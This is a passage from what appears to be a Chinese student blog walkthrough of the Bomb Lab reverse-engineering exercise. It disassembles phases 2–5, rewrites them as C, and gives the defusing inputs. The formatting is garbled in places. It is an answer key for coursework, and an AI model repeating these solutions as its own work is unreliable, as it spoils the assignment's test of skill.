$0x4,%rbx</span><br><span class="line">400f29:    48 39 eb               cmp    %rbp,%rbx</span><br><span class="line">400f2c:    75 e9                  jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">400f2e:    eb 0c                  jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">400f30:    48 8d 5c 24 04         lea    0x4(%rsp),%rbx</span><br><span class="line">400f35:    48 8d 6c 24 18         lea    0x18(%rsp),%rbp</span><br><span class="line">400f3a:    eb db                  jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">400f3c:    48 83 c4 28            add    $0x28,%rsp</span><br><span class="line">400f40:    5b                     pop    %rbx</span><br><span class="line">400f41:    5d                     pop    %rbp</span><br><span class="line">400f42:    c3                     retq   </span><br></pre></td></tr></table></figure>
<p>这段的结构比较复杂。先直译成含 <code>goto</code> 语句的 C 语言代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (nums[<span class="number">0</span>] == <span class="number">1</span>)               </span><br><span class="line">    <span class="keyword">goto</span> L_400f30;   </span><br><span class="line">    explode_bomb();    </span><br><span class="line">    <span class="keyword">goto</span> L_400f30;</span><br><span class="line">    L_400f17:                         </span><br><span class="line">    target = *(cur_pos - <span class="number">1</span>);        </span><br><span class="line">	target *= <span class="number">2</span>;    </span><br><span class="line"><span class="keyword">if</span> (*cur_pos == target)        </span><br><span class="line">    <span class="keyword">goto</span> L_400f25;    </span><br><span class="line">explode_bomb(); </span><br><span class="line">L_400f25:                           </span><br><span class="line">cur_pos += <span class="number">1</span>;    </span><br><span class="line"><span class="keyword">if</span> (cur_pos != end_pos)         </span><br><span class="line">    <span class="keyword">goto</span> L_400f17;    </span><br><span class="line"><span class="keyword">goto</span> L_400f3c; L_400f30:                          </span><br><span class="line">cur_pos = nums + <span class="number">1</span>;    </span><br><span class="line">end_pos = nums + <span class="number">6</span>;    </span><br><span class="line"><span class="keyword">goto</span> L_400f17; L_400f3c:                         </span><br><span class="line"><span class="keyword">return</span> target;</span><br></pre></td></tr></table></figure>
<p>整理得到：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (nums[<span class="number">0</span>] != <span class="number">1</span>)    </span><br><span class="line">explode_bomb(); </span><br><span class="line">end_pos = nums + <span class="number">6</span>;</span><br><span class="line"><span class="keyword">for</span> (cur_pos = nums + <span class="number">1</span>; cur_pos != end_pos; ++cur_pos) </span><br><span class="line">&#123;    </span><br><span class="line">	target = *(cur_pos - <span class="number">1</span>) * <span class="number">2</span>;    </span><br><span class="line"> 	<span class="keyword">if</span> (*cur_pos != target)        </span><br><span class="line">     	explode_bomb(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> target;</span><br></pre></td></tr></table></figure>
<p>通过这段代码，需要输入的 6 个整数就很显然了——第 1 个整数应当为 <code>1</code>，之后的每个整数都是前一个数的 2 倍。于是需要输入的 6 个整数依次为 <code>1</code>, <code>2</code>, <code>4</code>, <code>8</code>, <code>16</code>, <code>32</code>。</p>
<p>由之前的分析，本关密码即为 <code>1 2 4 8 16 32</code>。</p>
<p>在 <code>gdb</code> 中输入 <code>Phase 2</code> 的密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">That&#39;s number 2.  Keep going!</span><br></pre></td></tr></table></figure>
<h3 id="运行结果-2"><a class="markdownIt-Anchor" href="#运行结果-2"></a> 运行结果：</h3>
<p><img src="/2020/04/05/Bomb-Lab/phase2.png" alt></p>
<h2 id="phase_3"><a class="markdownIt-Anchor" href="#phase_3"></a> phase_3</h2>
<h3 id="实验过程-3"><a class="markdownIt-Anchor" href="#实验过程-3"></a> 实验过程</h3>
<p>main函数和前面实验过程一样，直接看<code>phase_3</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:  48 83 ec 18            sub    $0x18,%rsp</span><br><span class="line">  400f47:  48 8d 4c 24 0c         lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:  48 8d 54 24 08         lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:  be cf 25 40 00         mov    $0x4025cf,%esi</span><br><span class="line">  400f56:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  400f5b:  e8 90 fc ff ff         callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:  83 f8 01               cmp    $0x1,%eax</span><br><span class="line">  400f63:  7f 05                  jg     400f6a &lt;phase_3+0x27&gt;</span><br><span class="line">  400f65:  e8 d0 04 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f6a:  83 7c 24 08 07         cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:  77 3c                  ja     400fad &lt;phase_3+0x6a&gt;</span><br><span class="line">  400f71:  8b 44 24 08            mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:  ff 24 c5 70 24 40 00   jmpq   *0x402470(,%rax,8)</span><br><span class="line">  400f7c:  b8 cf 00 00 00         mov    $0xcf,%eax</span><br><span class="line">  400f81:  eb 3b                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f83:  b8 c3 02 00 00         mov    $0x2c3,%eax</span><br><span class="line">  400f88:  eb 34                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f8a:  b8 00 01 00 00         mov    $0x100,%eax</span><br><span class="line">  400f8f:  eb 2d                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f91:  b8 85 01 00 00         mov    $0x185,%eax</span><br><span class="line">  400f96:  eb 26                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f98:  b8 ce 00 00 00         mov    $0xce,%eax</span><br><span class="line">  400f9d:  eb 1f                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400f9f:  b8 aa 02 00 00         mov    $0x2aa,%eax</span><br><span class="line">  400fa4:  eb 18                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fa6:  b8 47 01 00 00         mov    $0x147,%eax</span><br><span class="line">  400fab:  eb 11                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:  e8 88 04 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  400fb7:  eb 05                  jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:  b8 37 01 00 00         mov    $0x137,%eax</span><br><span class="line">  400fbe:  3b 44 24 0c            cmp    0xc(%rsp),%eax</span><br><span class="line">  400fc2:  74 05                  je     400fc9 &lt;phase_3+0x86&gt;</span><br><span class="line">  400fc4:  e8 71 04 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:  48 83 c4 18            add    $0x18,%rsp</span><br><span class="line">  400fcd:  c3                     retq   </span><br></pre></td></tr></table></figure>
<p>首先看到进入函数后首先把栈顶指针%rsp寄存器向下减了8位，然后将（%rsp+8）和（%rsp+12）中的内容存在%rdx和%rcx寄存器中。再往后看，出现了一个奇怪的地址，我们将这个地址打印出来，显示的是“%d %d”，这个同第二题一样，表示我们输入的格式，应该输入两个数，中间使用空格进行区分。</p>
<p>然后调用了<code>&lt;__isoc99_sscanf@plt&gt;</code>函数，将返回值与1进行比较，如果输入的数量大于1，则进行跳转，否则引爆炸弹。经过与前面进行比较与推断，可知分辨要将输入的两个数保存在%rdx和%rcx寄存器中。然后将0x8（%rsp）即%rdx的数值与7进行比较，如果大于7的话，就引爆炸弹，否则继续执行，考虑到跳转指令使用的<code>ja</code>指令，由此可知对应的第一个数的输入范围是[0,7]。向下看，发现将0x8(%rsp)中的值放到了%eax中。</p>
<p>下一条指令使用的是<code>jmpq *0x402470(,%rax,8)</code>，这是一条switch语句的命令，根据输入的第一个参数的内容对基于<code>*0x402470</code>的首地址进行跳转，第一个参数有八个取值，从0到7，我们逐一测试。</p>
<p>这里以nums[0]取1为例，此时<code>0x402470(,%rax,8)</code>的值为<code>0x402470 + 1 * 8 = 0x402478</code>。使用gdb查看改地址存放的地址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;g 0x402470 + 1 * 8</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<p><code>0x402478: 0x0000000000400fb9</code></p>
<p>因此 400fb9: <code>mov $0x137,%eax</code> 即为 <code>nums[0]</code> 取 <code>1</code> 时跳转到的语句。</p>
<p>类似地，我们可以得到 <code>nums[0]</code> 取 [0, 7] 时对应的整个跳转表，从而得到以下 C 语言代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (nums[<span class="number">0</span>]) &#123;                          *<span class="comment">// result in %eax*   </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: result = <span class="number">0xcf</span>; <span class="keyword">break</span>;           *<span class="comment">// 0x400f7c*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: result = <span class="number">0x137</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400fb9*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: result = <span class="number">0x2c3</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400f83*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>: result = <span class="number">0x100</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400f8a*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>: result = <span class="number">0x185</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400f91*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>: result = <span class="number">0xce</span>; <span class="keyword">break</span>;           *<span class="comment">// 0x400f98*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>: result = <span class="number">0x2aa</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400f9f*    </span></span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>: result = <span class="number">0x147</span>; <span class="keyword">break</span>;          *<span class="comment">// 0x400fa6* &#125;                                           *// 0x400fbe* </span></span><br><span class="line"><span class="keyword">if</span> (result != nums[<span class="number">1</span>])                      *<span class="comment">// nums[1] = 0xc(%rsp)*    explode_bomb(); </span></span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
<p>通过这段代码，可以发现 <code>nums[0]</code> 经跳转后得到的新数 <code>result</code> 就应当为 <code>nums[1]</code>，</p>
<p>于是得到本关的 8 组解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 207&#96;, &#96;1 311&#96;, &#96;2 707&#96;, &#96;3 256&#96;, &#96;4 389&#96;, &#96;5 206&#96;, &#96;6 682&#96;, &#96;7 327</span><br></pre></td></tr></table></figure>
<p>输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0207</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Halfway there!</span><br></pre></td></tr></table></figure>
<h2 id="phase_4"><a class="markdownIt-Anchor" href="#phase_4"></a> Phase_4</h2>
<h3 id="实验过程-4"><a class="markdownIt-Anchor" href="#实验过程-4"></a> 实验过程</h3>
<p>找到<code>phase_4</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;phase_4&gt;:</span><br><span class="line"> 40100c:  48 83 ec 18            sub    $0x18,%rsp</span><br><span class="line"> 401010:  48 8d 4c 24 0c         lea    0xc(%rsp),%rcx</span><br><span class="line"> 401015:  48 8d 54 24 08         lea    0x8(%rsp),%rdx</span><br><span class="line"> 40101a:  be cf 25 40 00         mov    $0x4025cf,%esi</span><br><span class="line"> 40101f:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line"> 401024:  e8 c7 fb ff ff         callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"> 401029:  83 f8 02               cmp    $0x2,%eax</span><br><span class="line"> 40102c:  75 07                  jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line"> 40102e:  83 7c 24 08 0e         cmpl   $0xe,0x8(%rsp)</span><br><span class="line"> 401033:  76 05                  jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line"> 401035:  e8 00 04 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 40103a:  ba 0e 00 00 00         mov    $0xe,%edx</span><br><span class="line"> 40103f:  be 00 00 00 00         mov    $0x0,%esi</span><br><span class="line"> 401044:  8b 7c 24 08            mov    0x8(%rsp),%edi</span><br><span class="line"> 401048:  e8 81 ff ff ff         callq  400fce &lt;func4&gt;</span><br><span class="line"> 40104d:  85 c0                  test   %eax,%eax</span><br><span class="line"> 40104f:  75 07                  jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line"> 401051:  83 7c 24 0c 00         cmpl   $0x0,0xc(%rsp)</span><br><span class="line"> 401056:  74 05                  je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line"> 401058:  e8 dd 03 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 40105d:  48 83 c4 18            add    $0x18,%rsp</span><br><span class="line"> 401061:  c3                     retq   </span><br></pre></td></tr></table></figure>
<p>得到：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rdx &#x3D; %rsp + 8</span><br><span class="line">%rcx &#x3D; %rsp + 12</span><br></pre></td></tr></table></figure>
<p>由上一关的分析，本关密码同样应当是输入 2 个整数（之间有且仅有一个空格），这 2 个整数将被保存在之前 2 个参数所提供的 2 个地址中。</p>
<p>因此读取完毕后，栈内保存的信息为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x8(%rsp) &#x3D; nums[0]</span><br><span class="line">0xc(%rsp) &#x3D; nums[1]</span><br></pre></td></tr></table></figure>
<p>其中，<code>nums[0]</code> 和 <code>nums[1]</code> 表示输入的字符串中解析得到的（前）2 个整数。</p>
<p>401029: <code>cmp $0x2,%eax</code> 和 40102c: <code>jne 401035</code> 判断函数 <code>sscanf</code> 的返回值是否等于 <code>2</code>，是则继续执行之后的语句，否则直接跳到 401035: <code>callq 40143a</code> 引爆炸弹。同上一关的说明，即检查是否成功读入且仅读入了 2 个整数，如果不是则直接引爆炸弹。</p>
<p>40102e: <code>cmpl $0xe,0x8(%rsp)</code> 和 401033: <code>jbe 40103a</code> 判断 <code>0x8(%rsp)</code> 的值（即 <code>nums[0]</code>，也就是输入的第 1 个整数）是否不超过 <code>14</code>，是则直接跳到 40103a: <code>mov $0xe,%edx</code>，否则执行 401035: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，输入的第 1 个整数应当不超过 <code>14</code>（无符号数），即其取值范围为 [0, 14]。</p>
<p>40103a: <code>mov $0xe,%edx</code>、40103f: <code>mov $0x0,%esi</code> 和 401044: <code>mov 0x8(%rsp),%edi</code> 将 %edx、%esi、%edi 寄存器分别赋值为 <code>0xe</code>、<code>0x0</code>、<code>0x8(%rsp)</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%edi &#x3D; 0x8(%rsp) &#x3D; nums[0]</span><br><span class="line">%esi &#x3D; 0</span><br><span class="line">%edx &#x3D; 14</span><br></pre></td></tr></table></figure>
<p>401048: <code>callq 400fce</code> 调用函数 <code>func4</code>，也就是本关的主体部分。</p>
<h5 id="422-观察函数-func4"><a class="markdownIt-Anchor" href="#422-观察函数-func4"></a> 4.2.2 观察函数 func4</h5>
<p>在 bomb.asm 中找到函数 <code>func4</code> 对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;func4&gt;:  400fce:   48 83 ec 08</span><br><span class="line">sub    $0x8,%rsp  400fd2:   89 d0                  </span><br><span class="line">mov    %edx,%eax  400fd4:   29 f0                   </span><br><span class="line">sub    %esi,%eax  400fd6:   89 c1                 </span><br><span class="line">mov    %eax,%ecx  400fd8:   c1 e9 1f             </span><br><span class="line">shr    $0x1f,%ecx  400fdb:   01 c8                   </span><br><span class="line">add    %ecx,%eax  400fdd:   d1 f8                 </span><br><span class="line">sar    %eax  400fdf:   8d 0c 30               </span><br><span class="line">lea    (%rax,%rsi,1),%ecx  400fe2:   39 f9               </span><br><span class="line">cmp    %edi,%ecx  400fe4:   7e 0c                 </span><br><span class="line">jle    400ff2 &lt;func4+0x24&gt;  400fe6:   8d 51 ff          </span><br><span class="line">lea    -0x1(%rcx),%edx  400fe9:   e8 e0 ff ff ff         </span><br><span class="line">callq  400fce &lt;func4&gt;  400fee:   01 c0                 </span><br><span class="line">add    %eax,%eax  400ff0:   eb 15                   </span><br><span class="line">jmp    401007 &lt;func4+0x39&gt;  400ff2:   b8 00 00 00 00       </span><br><span class="line">mov    $0x0,%eax  400ff7:   39 f9                   </span><br><span class="line">cmp    %edi,%ecx  400ff9:   7d 0c                   </span><br><span class="line">jge    401007 &lt;func4+0x39&gt;  400ffb:   8d 71 01             </span><br><span class="line">lea    0x1(%rcx),%esi  400ffe:   e8 cb ff ff ff        </span><br><span class="line">callq  400fce &lt;func4&gt;  401003:   8d 44 00 01           </span><br><span class="line">lea    0x1(%rax,%rax,1),%eax  401007:   48 83 c4 08        </span><br><span class="line">add    $0x8,%rsp  40100b:   c3                     </span><br><span class="line">retq</span><br></pre></td></tr></table></figure>
<p>400fe9 和 400ffe: <code>callq 400fce</code> 都调用了函数 <code>func4</code> 自身，可见这是一个递归函数。</p>
<p>试译成 C 语言代码（经整理及部分改写，类似 2.2.3 节的处理流程）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*<span class="comment">// key in %edi, low in %esi, high in %edx* </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;   </span><br><span class="line">	<span class="keyword">int</span>      length   = high - low;             *<span class="comment">// length in %eax*   </span></span><br><span class="line">	<span class="keyword">unsigned</span> sign     = length &gt;&gt; <span class="number">31</span>;           *<span class="comment">// sign in %ecx*    </span></span><br><span class="line">	<span class="keyword">int</span>      half_len = (length + sign) &gt;&gt; <span class="number">1</span>;   *<span class="comment">// half_len in %eax*                                                *// half_len = length /= 2*    </span></span><br><span class="line">	<span class="keyword">int</span> mid = half_len + low;                   *<span class="comment">// mid in %ecx*    </span></span><br><span class="line">	<span class="keyword">int</span> result;                                 *<span class="comment">// result in %eax*    </span></span><br><span class="line">	<span class="keyword">if</span> (mid &gt; key) &#123;       </span><br><span class="line">	high   = mid - <span class="number">1</span>;        </span><br><span class="line">	result = func4(key, low, high) * <span class="number">2</span>;    </span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mid &gt;= key) &#123;                    *<span class="comment">// </span></span><br><span class="line">	mid == key*        result = <span class="number">0</span>;    &#125; </span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;                                    *<span class="comment">// mid &lt; key*        </span></span><br><span class="line">		low    = mid + <span class="number">1</span>;        </span><br><span class="line">		result = func4(key, low, high) * <span class="number">2</span> + <span class="number">1</span>;    </span><br><span class="line">	&#125;    </span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="423-回到函数-phase_4"><a class="markdownIt-Anchor" href="#423-回到函数-phase_4"></a> 4.2.3 回到函数 phase_4</h5>
<blockquote>
<p>%eax = func4(nums[0], 0, 14)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1234567  40104d:   85 c0                   test   %eax,%eax</span><br><span class="line">  40104f:   75 07                   jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:   83 7c 24 0c 00          cmpl   $0x0,0xc(%rsp)</span><br><span class="line">  401056:   74 05                   je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:   e8 dd 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:   48 83 c4 18             add    $0x18,%rsp</span><br><span class="line">  401061:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>40104d: <code>test %eax,%eax</code> 和 40104f: <code>jne 401058</code> 判断函数 <code>func4</code> 的返回值是否为 <code>0</code>，是则继续执行之后的语句，否则直接跳到 401058: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，输入的第 1 个整数 <code>nums[0]</code> 需要使函数 <code>func4(nums[0], 0, 14)</code> 的返回值为 <code>0</code>，其中 <code>nums[0]</code> 的取值范围为 [0, 14]。</p>
<p>401051: <code>cmpl $0x0,0xc(%rsp)</code> 和 401056: <code>je 40105d</code> 判断 <code>0xc(%rsp)</code> 的值（即 <code>nums[1]</code>，也就是输入的第 2 个整数）是否为 <code>0</code>，是则直接跳到 40105d: <code>add $0x18,%rsp</code> 弹栈返回，否则执行 401058: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，输入的第 2 个整数应当为 <code>0</code>。</p>
<h5 id="424-确定输入的第-1-个整数"><a class="markdownIt-Anchor" href="#424-确定输入的第-1-个整数"></a> 4.2.4 确定输入的第 1 个整数</h5>
<p>事实上，由于 <code>nums[0]</code> 的取值范围有限，直接遍历然后测试返回值是否为 <code>0</code> 即可。测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Solution</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> kBegin = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> kEnd   = <span class="number">14</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The solutions are:&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = kBegin; i &lt;= kEnd; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (func4(i, kBegin, kEnd) == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The solutions are: 0 1 3 7</span><br></pre></td></tr></table></figure>
<p>即为第 1 个整数可能的值。</p>
<p>综上，本关密码即为 <code>0 0</code>, <code>1 0</code>, <code>3 0</code>, <code>7 0</code>。</p>
<h5 id="425-测试"><a class="markdownIt-Anchor" href="#425-测试"></a> 4.2.5 测试</h5>
<p>这里以 <code>7 0</code> 为例，在 gdb 中输入 Phase 4 的密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7 0</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">So you got that one.  Try this one.</span><br></pre></td></tr></table></figure>
<h3 id="5-phase-5-pointers"><a class="markdownIt-Anchor" href="#5-phase-5-pointers"></a> 5. Phase 5: pointers</h3>
<h4 id="51-本关密码"><a class="markdownIt-Anchor" href="#51-本关密码"></a> 5.1 本关密码</h4>
<p><code>9ON567</code>（不唯一）</p>
<h4 id="52-解题过程"><a class="markdownIt-Anchor" href="#52-解题过程"></a> 5.2 解题过程</h4>
<blockquote>
<p>%rdi = input</p>
</blockquote>
<h5 id="521-观察函数-phase_5"><a class="markdownIt-Anchor" href="#521-观察函数-phase_5"></a> 5.2.1 观察函数 phase_5</h5>
<p>在 bomb.asm 中找到函数 <code>phase_5</code> 对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;phase_5&gt;:</span><br><span class="line"> 401062:   53                      push   %rbx</span><br><span class="line"> 401063:   48 83 ec 20             sub    $0x20,%rsp</span><br><span class="line"> 401067:   48 89 fb                mov    %rdi,%rbx</span><br><span class="line"> 40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line"> 401071:   00 00</span><br><span class="line"> 401073:   48 89 44 24 18          mov    %rax,0x18(%rsp)</span><br><span class="line"> 401078:   31 c0                   xor    %eax,%eax</span><br><span class="line"> 40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt;</span><br><span class="line"> 40107f:   83 f8 06                cmp    $0x6,%eax</span><br><span class="line"> 401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line"> 401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line"> 40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx</span><br><span class="line"> 40108f:   88 0c 24                mov    %cl,(%rsp)</span><br><span class="line"> 401092:   48 8b 14 24             mov    (%rsp),%rdx</span><br><span class="line"> 401096:   83 e2 0f                and    $0xf,%edx</span><br><span class="line"> 401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx</span><br><span class="line"> 4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line"> 4010a4:   48 83 c0 01             add    $0x1,%rax</span><br><span class="line"> 4010a8:   48 83 f8 06             cmp    $0x6,%rax</span><br><span class="line"> 4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line"> 4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)</span><br><span class="line"> 4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi</span><br><span class="line"> 4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi</span><br><span class="line"> 4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line"> 4010c2:   85 c0                   test   %eax,%eax</span><br><span class="line"> 4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line"> 4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line"> 4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line"> 4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line"> 4010d2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line"> 4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line"> 4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line"> 4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line"> 4010e5:   00 00</span><br><span class="line"> 4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line"> 4010e9:   e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 4010ee:   48 83 c4 20             add    $0x20,%rsp</span><br><span class="line"> 4010f2:   5b                      pop    %rbx</span><br><span class="line"> 4010f3:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>401067: <code>mov %rdi,%rbx</code> 将 %rdi 寄存器上保存的地址传给了 %rbx 寄存器。</p>
<blockquote>
<p>%rbx = %rdi = input</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401063:   48 83 ec 20             sub    $0x20,%rsp</span><br><span class="line"> ...</span><br><span class="line"> 40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line"> 401071:   00 00</span><br><span class="line"> 401073:   48 89 44 24 18          mov    %rax,0x18(%rsp)</span><br><span class="line"> ...</span><br><span class="line"> 4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line"> 4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line"> 4010e5:   00 00</span><br><span class="line"> 4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line"> 4010e9:   e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 4010ee:   48 83 c4 20             add    $0x20,%rsp</span><br><span class="line"> 4010f2:   5b                      pop    %rbx</span><br><span class="line"> 4010f3:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>这里的 <code>%fs:0x28</code> 是 FS 段寄存器（segment register）上偏移地址 <code>0x28</code> 上的数据。这是一个随机量，在这里起到 stack canary 的作用 。这部分代码即利用这个 stack canary 来确保 <code>0x18(%rsp)</code> 的数值（即栈底的 8 bytes）在函数前后没有发生改动，如果发生改动则执行 4010e9: <code>callq 400b30 &lt;__stack_chk_fail@plt&gt;</code> 调用系统函数 <code>__stack_chk_fail</code> 跳出，从而防止栈溢出（stack overflow）的问题。事实上，这段代码与本关的关系不大，这里就不做更多阐述了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12345  401078:   31 c0                   xor    %eax,%eax</span><br><span class="line">40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt;</span><br><span class="line">40107f:   83 f8 06                cmp    $0x6,%eax</span><br><span class="line">401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure>
<p>401078: <code>xor %eax,%eax</code> 将 %eax 寄存器设置为 <code>0</code>。</p>
<blockquote>
<p>%eax = 0</p>
</blockquote>
<p>40107a: <code>callq 40131b</code> 调用函数 <code>string_length</code>。由 1.2.4 节的分析，函数 <code>string_length</code> 的返回值就是字符串 <code>input</code> 的长度。</p>
